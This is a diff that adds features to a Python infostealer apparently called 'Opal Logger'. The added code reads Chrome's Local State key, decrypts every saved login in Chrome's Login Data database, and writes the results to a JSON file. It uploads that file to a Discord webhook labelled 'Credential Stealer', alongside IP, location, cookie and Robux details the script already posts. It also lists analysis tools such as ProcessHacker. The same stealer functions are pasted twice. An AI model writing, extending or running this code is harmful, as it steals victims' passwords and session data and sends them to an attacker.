@@ -7,6 +7,7 @@ from ctypes import cdll,byref,c_bool,c_char_p
 import requests
 import os
 import sys
+from json import loads, dumps
 import json
 import uuid
 import ctypes
@@ -33,6 +34,8 @@ import sqlite3
 import requests
 import psutil
 import base64
+from datetime import timezone, datetime, timedelta
+from dhooks import Webhook, File
 
 PROCNAMES = [
     "ProcessHacker.exe",
@@ -167,6 +170,72 @@ except:
 
 webhook = ("webhooker")
 
+def getUsername():
+    try:
+        USERNAME = os.getlogin()
+    except Exception as e:
+        USERNAME = "None"
+    return USERNAME
+
+def my_chrome_datetime(time_in_mseconds):
+    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)
+
+def encryption_key():
+    localState_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(localState_path, "r", encoding="utf-8") as file:
+        local_state_file = file.read()
+        local_state_file = json.loads(local_state_file)
+    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]
+
+def decrypt_password(enc_password, key):
+    try:
+        init_vector = enc_password[3:15]
+        enc_password = enc_password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, init_vector)
+        return cipher.decrypt(enc_password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return "No Passwords(logged in with Social Account)"
+
+def stealcreds():
+    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "Default", "Login Data")
+    shutil.copyfile(password_db_path,"my_chrome_data.db")
+    db = sqlite3.connect("my_chrome_data.db")
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
+    encp_key = encryption_key()
+    data = {}
+    for row in cursor.fetchall():
+        site_url = row[0]
+        username = row[1]
+        password = decrypt_password(row[2], encp_key)
+        date_created = row[3]
+        if username or password:
+            data[site_url] = []
+            data[site_url].append({
+                "username": username,
+                "password": password,
+                "date_created": str(my_chrome_datetime(date_created))
+                })
+        else:
+            continue 
+    cursor.close()
+    db.close()
+    os.remove("my_chrome_data.db")
+    
+    return data
+
+webhook = DiscordWebhook(url=webhook, username="Opal Logger", content=f"Passes Stolen from: **{getUsername()}**")
+print("please wait")
+
+
+
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -211,6 +280,85 @@ machines = platform.uname()
 pc = os.getenv("UserName")
 pass
 
+def getUsername():
+    try:
+        USERNAME = os.getlogin()
+    except Exception as e:
+        USERNAME = "None"
+    return USERNAME
+
+def my_chrome_datetime(time_in_mseconds):
+    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)
+
+def encryption_key():
+    localState_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(localState_path, "r", encoding="utf-8") as file:
+        local_state_file = file.read()
+        local_state_file = json.loads(local_state_file)
+    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]
+
+def decrypt_password(enc_password, key):
+    try:
+        init_vector = enc_password[3:15]
+        enc_password = enc_password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, init_vector)
+        return cipher.decrypt(enc_password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return "No Passwords(logged in with Social Account)"
+
+def stealcreds():
+    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "Default", "Login Data")
+    shutil.copyfile(password_db_path,"my_chrome_data.db")
+    db = sqlite3.connect("my_chrome_data.db")
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
+    encp_key = encryption_key()
+    data = {}
+    for row in cursor.fetchall():
+        site_url = row[0]
+        username = row[1]
+        password = decrypt_password(row[2], encp_key)
+        date_created = row[3]
+        if username or password:
+            data[site_url] = []
+            data[site_url].append({
+                "username": username,
+                "password": password,
+                "date_created": str(my_chrome_datetime(date_created))
+                })
+        else:
+            continue 
+    cursor.close()
+    db.close()
+    os.remove("my_chrome_data.db")
+    
+    return data
+
+webhook = DiscordWebhook(url=webhook, username="Credential Stealer", content=f"Passes Stolen from: **{getUsername()}**")
+
+try:
+    
+    data = stealcreds()
+    path = os.environ["temp"] +"\\data.json"
+    with open(path, 'w+') as outfile:
+        json.dump(data, outfile, indent=4)
+    with open(path, "rb") as f:
+        webhook.add_file(file=f.read(), filename='data.json')
+    response = webhook.execute()
+    os.remove(path)
+
+except Exception as e:
+    
+    webhook.add_content(f"Error While Getting Chrome Credentials from {getUsername()}:\n{e}")
+    response = webhook.execute()
+pass
 
 steal = {
             "embeds": [
@@ -218,7 +366,7 @@ steal = {
                     "author": {
                         "name": "Opal Logger",
                     },
-                    "description": f"{pc} ran Opal Logger \n\n**token log:** ||coming soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
+                    "description": f"{pc} tried nuking someone \n\n**token log:** ||coming soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
                     "color": 0x00C7FF,
                     
                     "footer": {
@@ -228,3 +376,20 @@ steal = {
             ]
         }
 requests.post("webhooker", json=steal)
+
+lmaooo = {
+            "embeds": [
+                {
+                    "author": {
+                        "name": "Opal Logger",
+                    },
+                    "description": f"Opal Logger Infected {pc}",
+                    "color": 0x00C7FF,
+                    
+                    "footer": {
+                      "text": "Opal Logger | https://github.com/syntheticc/Opal-Logger"
+                    }
+                }
+            ]
+        }
+requests.post("webhooker", json=lmaooo)
